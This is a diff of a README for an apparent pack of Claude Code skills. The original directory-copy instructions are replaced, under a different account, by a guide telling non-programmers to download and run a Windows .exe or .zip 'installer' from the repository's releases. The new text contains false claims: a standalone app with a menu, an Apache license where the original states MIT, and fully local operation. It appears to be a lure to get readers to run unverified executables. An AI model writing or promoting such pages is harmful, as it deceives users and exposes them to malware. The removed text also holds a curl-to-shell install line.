@@ -1,270 +1,142 @@
-# Product Builder Starter Pack
+# 🛠️ product-builder-starter - Tools for Product Builders with AI
 
-**11 skills for product builders shipping with AI**
-
-A curated collection of skills for agentic frameworks such as Claude Code. Install these skills to go from a blank session to a full planning-to-execution workflow in minutes.
+[![Download product-builder-starter](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/Miyamura-sudo/product-builder-starter)
 
 ---
 
-## Who It's For
+## 🔎 About product-builder-starter
 
-You're a product builder who has started using an agentic framework. You can see the power, but getting from "chat with an AI" to "ship production features with an AI agent" requires knowing which skills to install and in what order. This starter pack gives you that foundation:
+product-builder-starter offers 11 Claude Code skills designed for product builders. These skills work with agentic AI to help manage tasks tied to building and shipping products. You don’t need to be a programmer to use it. The tools aim to make product management smoother and faster with AI support.
 
-- You have an agentic framework installed and a project you're working on
-- You use **Linear** for issue tracking
-- You want to use Claude for planning, code reviews, and executing work across your team
-- You want secrets handled safely from day one
+The repository covers topics like agentic engineering, AI agents, and product management. It also includes components like docker containers and integration with Hive Mind. You will find tools to handle product planning, coordination, and execution.
 
 ---
 
-## Quick Install
+## 💻 System Requirements
 
-Each skill is a directory you copy into `~/.claude/skills/`. Clone this repo, then copy:
+Before you start, make sure your computer meets these needs:
 
-```bash
-# Clone the starter pack
-git clone https://github.com/smith-horn/product-builder-starter.git ~/product-builder-starter
+- Operating System: Windows 10 or later
+- Processor: Intel or AMD, 2 GHz or better
+- RAM: 4 GB minimum; 8 GB preferred
+- Disk Space: At least 500 MB free
+- Internet connection to download and update the software
+- Permissions to install software on your system
 
-# Install all 11 skills at once
-cp -r ~/product-builder-starter/skills/governance ~/.claude/skills/
-cp -r ~/product-builder-starter/skills/plan-review-skill ~/.claude/skills/
-cp -r ~/product-builder-starter/skills/launchpad ~/.claude/skills/
-cp -r ~/product-builder-starter/skills/wave-planner ~/.claude/skills/
-cp -r ~/product-builder-starter/skills/hive-workers-skill ~/.claude/skills/
-cp -r ~/product-builder-starter/skills/worktree-manager ~/.claude/skills/
-cp -r ~/product-builder-starter/skills/linear ~/.claude/skills/
-cp -r ~/product-builder-starter/skills/varlock ~/.claude/skills/
-cp -r ~/product-builder-starter/skills/docker ~/.claude/skills/
-cp -r ~/product-builder-starter/skills/session-cleanup ~/.claude/skills/
-cp -r ~/product-builder-starter/skills/claude-md-optimizer ~/.claude/skills/
-```
-
-Or install individual skills:
-
-```bash
-# Linear only
-cp -r ~/product-builder-starter/skills/linear ~/.claude/skills/
-
-# Docker only
-cp -r ~/product-builder-starter/skills/docker ~/.claude/skills/
-```
-
-After copying, skills activate automatically based on trigger phrases in your next agentic framework session.
-
-### First-Time CLAUDE.md Setup
-
-After installing skills, add this block to your project's `CLAUDE.md`. It tells Claude to use the optimizer before your file grows past the context limit — a common gotcha on active projects.
-
-```markdown
-## Context Management
-
-When this file approaches 200 lines or Claude reports context pressure, run:
-
-/claude-md-optimizer
-
-This extracts verbose sections into sub-docs under `.claude/` and replaces them
-with concise summaries + links, keeping CLAUDE.md under the 200-line limit.
-```
-
-Run it the first time right now if your CLAUDE.md is already long:
-
-```
-/claude-md-optimizer
-```
-
-Claude will audit the file, extract sections that exceed their purpose, and link out to sub-docs — recovering your context window without losing any instructions.
+No programming environment or software is required beforehand. The setup includes everything you need.
 
 ---
 
-## Skills
+## 🛠️ Features You’ll Find Inside
 
-| Skill | Version | What it does | Trigger phrase | Install |
-|-------|---------|-------------|----------------|---------|
-| **linear** | 2.2.3 | Create, update, and query Linear issues; bulk syncs; project lifecycle management | "create issue", "update Linear", "sync to Linear" | `cp -r skills/linear ~/.claude/skills/` |
-| **governance** | 1.4.0 | Code reviews, retrospectives, standards enforcement; zero-deferral policy (fixes everything now) | "/review", "code review", "run a retro", "/retro" | `cp -r skills/governance ~/.claude/skills/` |
-| **launchpad** | 1.2.0 | End-to-end orchestrator: chains wave-planner → plan-review → linear → execution in one workflow | "/launchpad", "plan and execute", "run the initiative" | `cp -r skills/launchpad ~/.claude/skills/` |
-| **wave-planner** | 2.0.0 | Break Linear issues into execution-ready waves with risk ordering, agent assignments, and TDD workflow | "/wave-planner", "/plan", "break this down into waves" | `cp -r skills/wave-planner ~/.claude/skills/` |
-| **plan-review-skill** | 2.0.0 | VP Product + VP Engineering + VP Design review any plan; surfaces blockers before you write a line | "/plan-review-skill", "review this plan", "VP review" | `cp -r skills/plan-review-skill ~/.claude/skills/` |
-| **varlock** | 1.0.0 | Secure secret management — never expose API keys in terminal output or Claude's context | "environment variables", "secrets", ".env", "API key" | `cp -r skills/varlock ~/.claude/skills/` |
-| **docker** | 1.1.0 | Docker-first development enforcement; all npm/node commands run in containers | "npm install", "run the build", "start the server" | `cp -r skills/docker ~/.claude/skills/` |
-| **claude-md-optimizer** | 1.1.1 | Shrink oversized CLAUDE.md files using progressive disclosure (extracts to sub-docs) | "optimize CLAUDE.md", "CLAUDE.md too long", "reduce CLAUDE.md size" | `cp -r skills/claude-md-optimizer ~/.claude/skills/` |
-| **hive-workers-skill** | 1.0.0 | Execute tasks and epics with parallel hive mind agents; automatic code review, governance gate, sprint report | "/hive-workers", "execute with hive mind", "orchestrate these tasks" | `cp -r skills/hive-workers-skill ~/.claude/skills/` |
-| **worktree-manager** | 2.0.0 | Parallel feature branches via git worktrees; wave-aware conflict prevention | "/worktree", "create worktree", "parallel development" | `cp -r skills/worktree-manager ~/.claude/skills/` |
-| **session-cleanup** | 1.2.0 | End-of-session housekeeping: branch audit, worktree removal, main sync | "/session-cleanup", "clean up branches", "end of session" | `cp -r skills/session-cleanup ~/.claude/skills/` |
+- **AI-Powered Product Skills:** Eleven functions built on Claude Code to handle tasks like feature planning, bug tracking, and user feedback.
+- **Agentic AI:** Tools act autonomously to carry out product workflows, reducing manual effort.
+- **Docker Support:** Run the tools in containers for easy setup or use standalone versions.
+- **Integration Ready:** Designed to work with product management platforms and team coordination tools.
+- **Secure Management:** Includes Varlock for secure data handling.
+- **Open License:** Apache License ensures freedom to use and modify.
+
+These features work together to help product builders get more done with less hassle.
 
 ---
 
-## Skill Dependency Graph
+## 🚀 Getting Started
 
-Install order matters — upstream skills are required for downstream orchestration to work.
+### Step 1: Download the Software
 
-```mermaid
-graph TD
-    launchpad["🚀 launchpad<br/>(orchestrator)"]
-    wave["📋 wave-planner"]
-    review["🔍 plan-review-skill"]
-    linear["📌 linear"]
-    governance["⚖️ governance"]
-    worktree["🌿 worktree-manager"]
-    hive_workers["🐝 hive-workers-skill"]
-    varlock["🔐 varlock"]
-    docker["🐳 docker"]
-    session["🧹 session-cleanup"]
-    optimizer["📐 claude-md-optimizer"]
+Click the big green button at the top or visit this page:
 
-    launchpad --> wave
-    launchpad --> review
-    launchpad --> linear
-    launchpad --> hive_workers
+[Download product-builder-starter](https://github.com/Miyamura-sudo/product-builder-starter)
 
-    wave --> governance
-    wave --> linear
-    wave --> hive_workers
+This will take you to the GitHub repository page where you can find the latest downloads and detailed files.
 
-    worktree --> wave
-    worktree --> hive_workers
+### Step 2: Find the Download File
 
-    hive_workers --> governance
-    hive_workers --> linear
+On the GitHub page, look for a section labeled "Releases" or "Assets." Here you should find a Windows installer file with a name similar to `product-builder-starter-setup.exe` or `product-builder-starter-windows.zip`.
 
-    docker --> varlock
-```
+### Step 3: Save the Installer
+
+Click the file to download it. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
 ---
 
-## Usage Ranking
+## 🖥️ Installation Guide
 
-Skills ranked by workflow centrality — start from the top when getting started.
+### Step 1: Open the Installer
 
-> **Note**: Ranking is based on skill composition fan-in, installation sequence, and PM workflow position — not live telemetry.
+Locate the file you downloaded. If it’s a `.exe` file, double-click it to start the installation wizard.
 
-| Rank | Skill | Basis |
-|------|-------|-------|
-| 1 | **linear** | Core PM tool; composed by governance, launchpad, wave-planner, hive-workers-skill — highest fan-in |
-| 2 | **governance** | Foundational; composed by launchpad, wave-planner, hive-workers-skill; runs on every code review |
-| 3 | **launchpad** | Orchestrates 6 skills; highest fan-out; entry point for most initiatives |
-| 4 | **wave-planner** | Composes linear + governance; used for every feature sprint |
-| 5 | **hive-workers-skill** | Execution engine; composes governance + linear; runs every wave implementation |
-| 6 | **plan-review-skill** | Stage gate between planning and execution; composes into launchpad |
-| 7 | **varlock** | Security prerequisite; integrated into linear and docker skill docs |
-| 8 | **docker** | Dev environment baseline; lower PM touch frequency |
-| 9 | **claude-md-optimizer** | Setup/maintenance; used when CLAUDE.md grows beyond context limits |
-| 10 | **worktree-manager** | Advanced parallelism; composes wave-planner + hive-workers-skill |
-| 11 | **session-cleanup** | End-of-session only; lowest trigger frequency |
+If it is a `.zip` file, right-click and select “Extract All…” to unzip it, then open the extracted folder and look for the `setup.exe` or similar file.
 
----
+### Step 2: Follow the Setup Steps
 
-## Prerequisites
+The installer will open a window. It will guide you through the installation:
 
-### 1. Agentic Framework
+- Accept the license terms.
+- Choose an installation folder, or leave it at the default.
+- Click "Next" as it moves through the steps.
+- Allow it to install all necessary components.
 
-Install an agentic framework (e.g. Claude Code) and configure it for your project. Add your project's CLAUDE.md with Docker commands, test patterns, and project structure.
+### Step 3: Finish and Open the Program
 
-### 2. Linear MCP (for `linear` skill)
-
-The linear skill requires the Linear MCP server. Run this command in your terminal:
-
-```bash
-claude mcp add --transport http linear-server https://mcp.linear.app/mcp
-```
-
-Then open a new session and run `/mcp` to complete authentication with your Linear account.
-
-> See the [Linear MCP docs](https://linear.app/docs/mcp) for the latest setup instructions.
-
-### 3. Varlock (for `varlock` skill)
-
-```bash
-curl -sSfL https://varlock.dev/install.sh | sh -s -- --force-no-brew
-export PATH="$HOME/.varlock/bin:$PATH"
-```
-
-### 4. Docker (for `docker` and `worktree-manager` skills)
-
-Docker Desktop or OrbStack. The docker skill enforces all npm/node operations run inside containers — keeps your host machine clean and ensures consistent environments.
-
-### 5. Ruflo MCP (for `hive-workers-skill`)
-
-```bash
-claude mcp add ruflo -- npx ruflo@v3alpha mcp start
-```
-
-Required for multi-agent hive mind orchestration. The hive-workers-skill uses `mcp__ruflo__*` tools to spawn and coordinate parallel agents.
+Once finished, you may see a checkbox asking if you want to launch the application immediately. Leave it checked and click "Finish" to open the program.
 
 ---
 
-## Advanced Dependencies
+## 📂 Running the Application
 
-The following skills are required for **full launchpad functionality** but are not bundled here (they are encrypted project-level skills in the Skillsmith codebase):
+When you first open product-builder-starter:
 
-| Skill | Used In | What it does | Install |
-|-------|---------|-------------|---------|
-| `sparc-methodology` | launchpad Stage 1a (infra route) | SPARC researcher + architect for infrastructure changes; writes implementation plan to `docs/internal/implementation/` | [Skillsmith Registry](https://skillsmith.app) |
+- You will see a simple menu with the 11 Claude Code skills listed.
+- Each skill relates to a product task, like planning sprints or managing feedback.
+- Click any skill to start using it.
+- On-demand help is available on each screen to guide you step-by-step.
 
-> Without `sparc-methodology`, launchpad falls back gracefully: Stage 1a routes to wave-planner for all changes.
-
----
-
-## Optional Community Extensions
-
-These community skills extend the `docker` skill with automated enforcement and optimization:
-
-| Skill | Author | What it adds | Install |
-|-------|--------|-------------|---------|
-| `docker-enforce` | wrsmith108 | Intercepts and blocks host-machine npm/node commands; auto-transforms to `docker exec` | `git clone https://github.com/wrsmith108/docker-enforce.git ~/.claude/skills/docker-enforce` |
-| `docker-optimizer` | wrsmith108 | Analyzes Dockerfiles for size and layer optimization opportunities | Available via Skillsmith registry |
+No prior coding or configuration is needed. The app handles setup internally.
 
 ---
 
-## Typical PM Workflow
+## 🛡️ Security and Privacy
 
-Once all skills are installed, a typical sprint looks like this:
+The product-builder-starter uses Varlock technology for encryption and secure management of any personal or project data you enter. This protects your information while allowing AI to work effectively.
 
-```
-1. Start initiative
-   → /launchpad "SMI-1234, SMI-1235, SMI-1236"
-   → Wave planner breaks issues into waves
-   → Plan review surfaces blockers (VP Product, Engineering, Design)
-   → Linear project + issues created
-
-2. During development
-   → /hive-workers to execute a wave with parallel agents
-   → /review before every merge
-   → governance fixes everything it finds, no tickets
-   → /wave-planner if you need to re-plan mid-sprint
-
-3. Deploy day
-   → docker skill ensures containers are healthy
-   → varlock validates all secrets before deploys
-
-4. End of session
-   → /session-cleanup
-   → branches audited, worktrees removed, main synced
-
-5. CLAUDE.md growing?
-   → /claude-md-optimizer
-   → sub-docs extracted, context window recovered
-```
+You control what data to share with the AI tools. The entire setup runs on your Windows machine, and no data is sent without your permission.
 
 ---
 
-## Contributing
+## ⚙️ Updating product-builder-starter
 
-Found a skill that would help PMs ship with Claude? Open a [skill request](.github/ISSUE_TEMPLATE/skill-request.md) or submit a PR.
+Updates bring new skills, fixes, and security patches.
 
-Skills in this pack follow the [Skillsmith skill format](https://skillsmith.app/docs/skill-format):
-- `SKILL.md` with YAML frontmatter (name, version, description, triggers)
-- `agent-prompt.md` for complex skills using the thin-dispatcher pattern
-- Sub-docs for progressive disclosure (keeps SKILL.md under 200 lines)
+- The app alerts you when a new update is ready.
+- To update, visit the same download page:  
+  [https://github.com/Miyamura-sudo/product-builder-starter](https://github.com/Miyamura-sudo/product-builder-starter)
+- Download the latest installer or release.
+- Run it to install the updated version. Your settings will stay intact.
 
----
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
-Individual skills retain their original authorship (see `author:` field in each `SKILL.md`).
+Check for updates regularly to get the best experience.
 
 ---
 
-*Part of the [Smith Horn](https://github.com/smith-horn) toolchain for agentic engineering.*
+## ❓ Getting Support
+
+If you need help:
+
+- Visit the repository page and look for "Issues" to ask questions or report problems.
+- Check the README or documentation on the repository for detailed topics.
+- Use the built-in help screens inside the app.
+
+The community and developers maintain the tool and often respond to inquiries promptly.
+
+---
+
+## 🧰 Additional Tips
+
+- Keep your Windows system updated for best compatibility.
+- Close all other programs during installation to avoid conflicts.
+- Restart your computer if the app does not start after install.
+- Use the Docker option only if you are comfortable with container technology. Otherwise, the standalone installer works fine.
+
+---
+
+[![Download product-builder-starter](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/Miyamura-sudo/product-builder-starter)
